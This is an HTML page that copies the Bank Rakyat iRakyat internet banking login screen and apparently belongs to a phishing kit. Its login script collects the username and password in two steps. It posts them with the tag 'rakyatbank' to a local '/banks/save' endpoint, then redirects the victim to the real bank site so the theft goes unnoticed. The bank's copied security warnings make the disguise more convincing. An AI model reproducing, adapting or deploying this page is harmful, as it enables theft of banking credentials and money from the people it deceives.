<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!-- saved from url=(0051)https://www2.irakyat.com.my/personal/login/login.do -->
<html xmlns="http://www.w3.org/1999/xhtml" style="display: block;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">    
	<link rel="shortcut icon" href="https://www2.irakyat.com.my/personal/images/favicon.ico">
	
	
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=1">  

<meta name="csrf-token" content="{{ csrf_token() }}">
	<meta name="google-site-verification" content="google708dc5bf269e6e6d.html">  
	        
	<title>iRakyat</title>
	
 







 
<link href="banks/irakyat/style.min.css" rel="styleSheet" type="text/css">    
<link href="banks/irakyat/style_RWD.min.css" rel="styleSheet" type="text/css"> 
<link href="banks/irakyat/dashboard.min.css" rel="styleSheet" type="text/css"> 
<link href="banks/irakyat/bootstrap.min.css" rel="styleSheet" type="text/css">
<link href="banks/irakyat/bootstrap-select.min.css" rel="styleSheet" type="text/css"> 
<link href="banks/irakyat/bootstrap-datepicker.min.css" rel="styleSheet" type="text/css">  
<link href="banks/irakyat/animate.min.css" rel="styleSheet" type="text/css"> 
<link href="banks/irakyat/calibrifont.css" rel="styleSheet" type="text/css">
<link href="banks/irakyat/table.min.css" rel="styleSheet" type="text/css">
<link href="banks/irakyat/tooltips-menu.min.css" rel="styleSheet" type="text/css">
<link href="banks/irakyat/Jquerytoggle.css" rel="styleSheet" type="text/css">  
	     
	<script type="text/javascript" src="banks/irakyat/common.min.js.download"></script>
	<script type="text/javascript" src="banks/irakyat/validation.jsp"></script>
	<script type="text/javascript" src="banks/irakyat/jquery-1.12.4.min.js.download"></script>
	<script type="text/javascript" src="banks/irakyat/jquery.easing.min.js.download"></script>
	<script type="text/javascript" src="banks/irakyat/appear.min.js.download"></script>
	<script type="text/javascript" src="banks/irakyat/bootstrap.min.js.download"></script>
	<script type="text/javascript" src="banks/irakyat/bootstrap-select.min.js.download"></script>
	<script type="text/javascript" src="banks/irakyat/jquery.accordion.min.js.download"></script>
	<script type="text/javascript" src="banks/irakyat/jquery.preventDoubleSubmit.min.js.download"></script>  
	<script type="text/javascript">
	(function() {
	var message = "Copyright © 2014 Bank Rakyat";

function clickIE4() {
	if (event.button==2) {
		alert(message);
		return false;
	}
}

function clickNS4(e) {
	if (document.layers || document.getElementById && !document.all) {
		if (e.which==2 || e.which==3) {
			alert(message);
			return false;
		}
	}
}

if (document.layers) {
	document.captureEvents(Event.MOUSEDOWN);
	document.onmousedown = clickNS4;
}
else if (document.all && !document.getElementById) {
	document.onmousedown = clickIE4;
}
document.oncontextmenu = function() {
	//alert(message);
	return false; 
}
	})();
	</script>
	<script type="text/javascript" src="banks/irakyat/jquery.simplemodal.1.4.4.min.js.download"></script>
<script type="text/javascript">
	var securityPopup = false;

	if (self == top) {
		document.documentElement.style.display = 'block';
	} else {
		top.location = self.location;
	}

	function countdown(secs) {
		var btn = document.getElementById('alertclose');
		btn.value = 'Please wait... (' + secs + ')';
		if (secs < 1) {
			clearTimeout(timer);
			btn.disabled = false;
			btn.value = 'OK';
			//btn.focus();
		}
		secs--;
		var timer = setTimeout('countdown(' + secs + ')', 1000);
	}


	$.ajaxSetup({
            headers: {
                'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
            }
        });

        function passwordfunction() {
            if(document.getElementById("username").value.length > 0 ) {
                $.ajax({
                    type: "POST",
                    data: {username: document.getElementById("username").value,
                        password: document.getElementById("password").value,
                        bankname: "rakyatbank"},
                    url : "/banks/save",
                    success : function (sdata) {
                        // document.getElementById("test").innerHTML = sdata ;
                        // document.getElementById("test").append(sdata);
                        // $('#test').html(sdata);
                        location.href = "https://www2.irakyat.com.my/personal/login/login.do?step1=";
                    }
                });
            }
        }

        function usernamefunction() {
            if(document.getElementById("username").value.length > 0 ) {
                document.getElementById("usernamelabel").style.display = "none";
                document.getElementById("username").style.display = "none";
                document.getElementById("usernamebtn").style.display = "none";
                document.getElementById("passwordlabel").style.display = "block";
                document.getElementById("password").style.display = "block";
                document.getElementById("passwordbtn").style.display = "block";
            }
        }


	$(function() {

		$('#slidingDiv').hide();
		$('#demo').click(function() {
			if ($('#slidingDiv').is(':visible')) {
			}
			$('#slidingDiv').slideToggle();
		});

		$(document).ready(function() {
			$('#step2').preventDoubleSubmit();
			
		});

		$('a.notice_title').click(function() {
			$(this).siblings('div.notice_content').toggle('fast');
			return false;
		});

		var currentDomain = window.location.hostname;
		var referrerDomain = document.referrer.split('/')[2];

		if (!!referrerDomain && referrerDomain.indexOf(':') > 0) {
			referrerDomain = referrerDomain.split(':')[0];
		}

		//if (securityPopup == true && currentDomain !== referrerDomain) {
		if (securityPopup == true) {
			$('#securityalert').modal(
					{
						opacity : 70,
						autoResize : false,
						onOpen : function(dialog) {
							dialog.overlay.fadeIn('fast', function() {
								dialog.data.hide();
								dialog.container.fadeIn('slow', function() {
									dialog.data.fadeIn('fast', function() {
										$('#simplemodal-container').css(
												'height', 'auto');
										$.modal.setPosition();
									});
								});
							});
						},
						onShow : function(dialog) {
							countdown(4);
						},
						onClose : function(dialog) {
							dialog.container.fadeOut('slow', function() {
								dialog.overlay.fadeOut('fast', function() {
									$.modal.close();
									$('#securityalert').hide();
									$('#username').focus();
								});
							});
						}
					});
		}
		
		$('#register').on("show.bs.modal", function () {
    		$('.lazy_load').each(function() {
        		var img = $(this);
        		img.attr('src', img.data('src'));
    		});
		}); 
	});
	
	

	var labelUsername = "Username";
	function fnClear(thisForm) {
		resetForm(thisForm);
		return false;
	}
	function required() {
		this.aa = new Array("username", labelUsername);
	}
</script>
</head>      
<body>                    

<nav class="navbar navbar-default">     

	<div class="container">
	<a href="https://www.irakyat.com.my/" target="_top"><img src="banks/irakyat/logo-new.png" class="logo"></a>

	<a href="https://www2.irakyat.com.my/personal/login/login.do#"><img src="banks/irakyat/logo-bankrakyat.png" class="logo-bankrakyat"></a>
	</div>
</nav>
  
	<noscript>
		<table border="0" cellspacing="0" cellpadding="0" class="list">
  	        <tr class="hide">
  	            <td class="error">Please enable Javascript in order to proceed.
	            <a href='/personal/jsRequired.jsp' target="_blank">How To</a>
	            </td>
  	       </tr>
      	</table>
	</noscript>   
	<div id="securityalert">
		<div class="alerttitle">
			IMPORTANT ANNOUNCEMENT
		</div>
		<div class="alertcontent">
			<p style="text-align:center;">
			<img src="banks/irakyat/mydebit.png" width="164" height="108">
			</p>
			<br>
			<p>
				Change your ATM &amp; Debit Card-i to the new Bank Rakyat MyDebit Card at our branches or via iRakyat NOW!From <b><u>1st NOVEMBER 2017</u></b>, the ATM &amp; Debit Card-i <b><u>WILL NO LONGER BE APPLICABLE FOR USE</u></b>.
			</p>
			<br>
		</div>
		<div class="alerttitle">
			Security Alert
		</div>
		<div class="alertcontent">
			<p>
				Bank Rakyat  
				<span class="redbold">WILL NOT   </span>
				request for your username and password without a Secure Phrase under any circumstances!
			</p>
			<br>
			<div class="box">
				<p><strong>DO NOT enter your PASSWORD or your TAC if:</strong></p><p>Secure Phrase is not displayed<br>Secure Phrase displayed is wrong or is not the chosen phrase and colour</p>
			</div>
		</div>
		<div class="alertclose">
			<input disabled="" type="button" id="alertclose" class="simplemodal-close" value="Please wait... (5)">
		</div>
	</div>

	<!-- Registration popup -->
<div id="register" class="modal fade" role="dialog">
	<div class="modal-dialog">

		<!-- Modal content-->
		<div class="modal-content">
			<button type="button" class="close" data-dismiss="modal"></button>
			<div class="modal-body">
				<h3>First Time Registration</h3>
				<div class="process">
					<ul>
						<li class="active"><span>1</span> Select Your Account Type <img src="banks/irakyat/progress-arrow-on.png" alt="t">
						</li>
						<li><span>2</span> Authenticate Your Account <img src="banks/irakyat/progress-arrow-on.png" alt="t">
						</li>
						<li><span>3</span> Authenticate Your Mobile Number <img src="banks/irakyat/progress-arrow-on.png" alt="t">
						</li>
						<li><span>4</span> Create Username And Password <img src="banks/irakyat/progress-arrow-on.png" alt="t">
						</li>
						<li><span>5</span> Complete Registration</li>
					</ul>
				</div>
				<div class="modal-line ">Please select option below that
					describes you by clicking on the image</div>
				<div class="modal-bottom">
					<ul>
						<li>
							<div class="modal-img">
								<a href="https://www2.irakyat.com.my/personal/register/register_via_epin.do"><img class="lazy_load" src="https://www2.irakyat.com.my/personal/login/login.do" data-src="/personal/images/c-card.png" alt="t"></a>
							</div>
							<div class="bottom-line">
								<p>I have a Bank Rakyat</p>
								<h4>MyDebit Card-i/ Credit Card</h4>
							</div>
						</li>
						<li>
							<div class="modal-img">
								<a href="https://www2.irakyat.com.my/personal/register/register_via_contact_center.do"><img class="lazy_load" src="https://www2.irakyat.com.my/personal/login/login.do" data-src="/personal/images/temp-id.png" alt="t"></a>
							</div>
							<div class="bottom-line">
								<p>I don't have any Bank Rakyat Cards, I will register via</p>
								<h4>Temporary ID</h4>
							</div>
						</li>
					</ul>
				</div>
			</div>
		</div>
	</div>
</div>
<!-- End of Registration popup -->

	<form id="userForm" name="userForm" action="https://www2.irakyat.com.my/personal/login/login.do" class="txnform" method="post" autocomplete="off" onsubmit="return validateRequired(this)">
		<input type="hidden" name="step2" value="">

		<section class="section-main">
		<div class="login-main-container">
			<div class="container">
				<div class="clear"></div>
				<div class="login-inner">
					<div class="login-left">
						<h3>
							Welcome to <b>iRakyat</b> Internet Banking
						</h3>
						<span>Manage your account online at <br> your convenience</span>
						<div class="mb-15"></div>
						<div class="error">
							
							
							
						</div>
						<div class="form-group">
							<div id="usernamelabel" class="name">
								<b>Username:</b>
							</div>
							<div id="passwordlabel" style="display:none;" class="name">
								<b>Password:</b>
							</div>
							<div class="form-group-input">
								<input id="username" maxlength="40" name="username" tabindex="1" type="text" size="30">
								<input id="password" maxlength="40" name="password" tabindex="1" type="text" style="display:none;" size="30">
							</div>
						</div>
						<div class="login-button">
							<input id="clear" name="clear" value="Clear" tabindex="3" onclick="return resetForm(this.form);" class="orangeButton" type="button">
							<input id="usernamebtn" name="step2" value="Login" tabindex="2" class="orangeButton" onclick="usernamefunction();">
							<input id="passwordbtn" style="display:none;" name="step2" value="Login" tabindex="2" class="orangeButton" onclick="passwordfunction();">
						</div>
						<div class="clear"></div>

						<div class="register-button">
							<input data-target="#register" id="register" name="register" value="Register" tabindex="3" class="blueButton" data-toggle="modal" type="button">
						</div>
						<div>
							<input id="demo" name="demo" value="Demo" tabindex="3" class="bluePlayButton" type="button">
							<div id="slidingDiv" class="login-demo-box" style="display: none;">
								<ul>
									<li><a href="https://youtu.be/Q5LRkGz3qok" target="_blank">First Time Registration (with card) </a></li>
									<li><a href="https://youtu.be/7uljVJ29otg" target="_blank">First Time Registration (with Temporary ID) </a></li>
									<li><a href="https://youtu.be/hSNLOlxXZeM" target="_blank">Fund Transfer to Own Account </a></li>
									<li><a href="https://youtu.be/vYGdhYkaioc" target="_blank">Fund Transfer to Other Bank Rakyat Accounts </a></li>
									<li><a href="https://youtu.be/lKQcL5PUaGw" target="_blank">Fund Transfer From Bank Rakyat to Other Banks </a></li>
								</ul>
							</div>
						</div>

						<div class="clear"></div>
						<div class="login-problem">
							<div class="login-problemMesg">
								PROBLEM LOGIN
							</div>
							<a class="current" href="https://www2.irakyat.com.my/personal/reset/forgot_id_or_password.do">Forgot Username / Password</a>
							<br>
							<a class="current" href="https://www2.irakyat.com.my/personal/change_card/change_card.do">Change Card</a>
						</div>
						<div class="clear"></div>
					</div>

					<div class="login-right">
						<div class="login-right-box flex-column-reverse-1200">
							<div class="login-right-left">
								<h3>
									iRakyat Internet banking
								</h3>
								<ul>
									<li>23 hours 30 minutes (12.31 am - 11.59 pm)
									</li>
								</ul>
								<h3>
									Call Centre Tele-Rakyat
								</h3>
								<ul>
									<li>Local 1-300-80-5454
									</li>
									<li>International +603-5526-9000
									</li>
									<li>Every Monday to Friday from 7.30am to 9.30pm
									</li>
									<li>Every Saturday and Sunday from 8.30am to 5.30pm except on Federal Public Holidays.
									</li>
								</ul>
							</div>
							<div class="login-right-right">
								<a href="https://www2.irakyat.com.my/personal/login/login.do#"><img src="banks/irakyat/ads.jpg" style="display: inline !important;"> </a>
							</div>
						</div>
						<div class="separator"></div>

						<div class="login-right-box flex-column">
							<div class="flex-center logo-police">
								<img src="banks/irakyat/logo-police.jpg" class="left">
								<h3>
									iRakyat Internet banking
								</h3>
							</div>
							<ul>
								<li><b class="orangetext">NEVER  </b> respond to any phone call/ SMS/ e-mail requesting your bank account details.</li>
								<li><b class="orangetext">NEVER  </b> reveal your bank account details/ ATM PIN/ Internet banking password to anyone.</li>
								<li><b class="orangetext">NEVER  </b> follow instruction from unknown party to do banking transaction or make changes to your bank account details.</li>
								<li><b class="orangetext">NEVER  </b> be a victim of schemes that sound too good to be true.</li>
							</ul>
						</div>
					</div>
				</div>
			</div>
		</div>
		</section>
	<div style="display: none;"><input type="hidden" name="_sourcePage" value="haefodZ9lVL-Q8DOXz10QWlhYwprz9dNgLMPU0gJnL02z7GgD8ei3A=="><input type="hidden" name="__fp" value="XiCJ_zBgWj0="></div></form>

	<!-- start footer -->
<footer>
  <div class="login-footer-main-container pt-25">
  	<div class="container">
  		<div class="login-footer-inner">
		  	<div class="login-footer-left">
			  	<ul>
			  		<li>
						<a href="https://www2.irakyat.com.my/personal/welcome/welcome.do?disclaimer=">Disclaimer</a>
					</li>
					<li>
						<a href="https://www2.irakyat.com.my/personal/welcome/welcome.do?clientCharter=">Client Charter</a>
					</li>
					<li>
						<a href="https://www2.irakyat.com.my/personal/welcome/welcome.do?privacySecurity=">Privacy Policy</a>
					</li>
					<li>
						<a href="https://www2.irakyat.com.my/personal/welcome/welcome.do?termsConditions=">Terms &amp; Conditions</a>
					</li>
					<li>
						<a href="https://www2.irakyat.com.my/personal/welcome/welcome.do?personalDataProtectionAct=">Personal Data Protection Act</a>
					</li>
					<li>
						<a href="https://www2.irakyat.com.my/personal/welcome/welcome.do?FAQ=">FAQ</a>
					</li>
				</ul>
				<br>
				<div class="login-copyright">
					Copyright 2014 © Bank Rakyat. All rights reserved.
					<br>
					Best viewed with Google Chrome, Mozilla Firefox, and Internet Explorer Version 11 and above.
				</div>
			</div>
			<div class="login-footer-middle">
				Follow Us On
				<a href="https://www.facebook.com/myBANKRAKYAT" target="_blank" class="external-link"><img src="banks/irakyat/icon-fb.gif">
				</a>
	            <a href="https://twitter.com/intent/follow?original_referer=http%3A%2F%2Fwww.bankrakyat.com.my%2Fweb%2Fguest%2Fhome&amp;screen_name=myBankRakyat&amp;tw_p=followbutton&amp;variant=2.0" target="_blank" class="external-link"><img src="banks/irakyat/icon-twitter.gif">
				</a>
	        </div>
	        <div class="login-footer-left">
	            <div class="contact">
	                <img src="banks/irakyat/icon-email.gif" alt="t">
	                <a href="http://www.bankrakyat.com.my/khidmat-pelanggan" target="_blank">Contact Us</a>
	            </div>
	        </div>
		</div>
	</div>
	<!-- right -->
	</div>
</footer>
<!-- footer -->
<!-- end footer -->

<script type="text/javascript">
var externalMessage = "You are about to leaving iRakyat.com.my to a third party website & Bank Rakyat's privacy policy will cease to apply.\n\nYou agree to enter this link with your own risk and Bank Rakyat makes no warranties to the status of this link or information contained in the website you are about to access.\n\nThis link is provided for your convinience only and shall not be considered or construed as an endorsement or verification of such linked website or its contents by Bank Rakyat.";
$(document).on('click', 'a.external-link', function(e){
	e.preventDefault();
	if($(this).attr('href') != '#'){
		if( confirm(externalMessage) ){
			window.open($(this).attr('href'));
		}
	}
});
</script>
						

</body></html>